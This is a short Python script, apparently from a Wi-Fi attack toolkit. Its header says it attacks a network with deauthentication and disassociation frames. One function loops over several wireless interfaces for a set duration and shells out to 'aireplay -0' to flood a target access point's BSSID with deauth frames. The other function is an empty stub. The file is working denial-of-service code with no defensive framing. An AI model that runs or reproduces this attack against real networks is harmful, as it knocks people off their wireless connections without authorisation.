# attacks particular network with deauth and disoc frames or multiplex
import time
import os


def disrupt(interface):
    pass


# This attack is many interfaces one target
def multi_to_one_to_many_disrupt(interfaces, target, framecount, duration, interval):

    future_time = time.time() + (60 * duration)
    while future_time > time.time():
        for interface in interfaces:
            os.system('aireplay -0 {} -a {} {}'.format(framecount, target.bssid, interface))
            time.sleep(interval)

